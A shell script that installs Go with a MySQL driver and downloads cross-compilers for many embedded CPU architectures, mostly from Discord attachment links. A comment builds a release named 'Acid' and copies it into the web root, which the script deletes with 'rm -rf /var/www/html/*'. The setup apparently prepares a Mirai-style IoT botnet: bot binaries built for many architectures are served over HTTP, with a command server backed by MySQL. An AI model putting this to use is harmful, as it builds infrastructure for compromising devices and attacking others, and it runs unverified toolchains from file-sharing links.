#!/bin/sh
#./build.sh release Acid; cp release/* /var/www/html/
mkdir bins
cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
sha256sum go1.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
source ~/.bash_profile
go version
go env
cd ~/
mkdir /etc/xcompile
mkdir release
rm -rf /var/www/html/*
cd /etc/xcompile/
wget https://cdn.discordapp.com/attachments/849107215688531988/852721191264583740/cross-compiler-armv4l.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852721887287967785/cross-compiler-armv5l.tar.bz2
wget https://cdn.discordapp.com/attachments/842399079668514878/842399656973172786/cross-compiler-armv6l.tar.bz2
wget https://cdn.discordapp.com/attachments/737802958800158741/748823939442278400/cross-compiler-armv7l.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231835389165568/cross-compiler-m68k.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852719670989029416/cross-compiler-mips.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852720517382930492/cross-compiler-mipsel.tar.bz2
wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231594896818227/cross-compiler-sh4.tar.bz2
wget https://cdn.discordapp.com/attachments/819624045632028724/827231910685835264/cross-compiler-sparc.tar.bz2
wget https://cdn.discordapp.com/attachments/849107215688531988/852717482229497916/cross-compiler-x86_64.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
rm *.tar.bz2
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-x86_64 x86_64
